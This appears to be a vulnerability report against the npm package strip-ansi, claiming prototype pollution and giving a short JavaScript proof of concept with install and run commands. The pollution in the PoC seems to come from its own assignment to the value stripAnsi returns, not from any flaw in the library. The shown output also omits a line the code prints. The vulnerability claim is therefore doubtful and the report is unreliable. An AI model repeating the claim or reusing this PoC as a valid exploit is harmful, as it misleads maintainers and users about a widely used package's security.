# Description

`strip-ansi` is a popular library with 61,107,490 Weekly downloads.It is used to  escape ANSI codes from a strings.It is also vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
var stripAnsi = require('strip-ansi');
const obj = {}
console.log('Before: ' + {}.polluted)
stripAnsi(obj['__proto__'], {}).polluted = 'Polluted!'
console.log('After: ' + {}.polluted)
```

2. Execute the following commands in terminal:

```
npm i strip-ansi # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
After: Polluted!
```
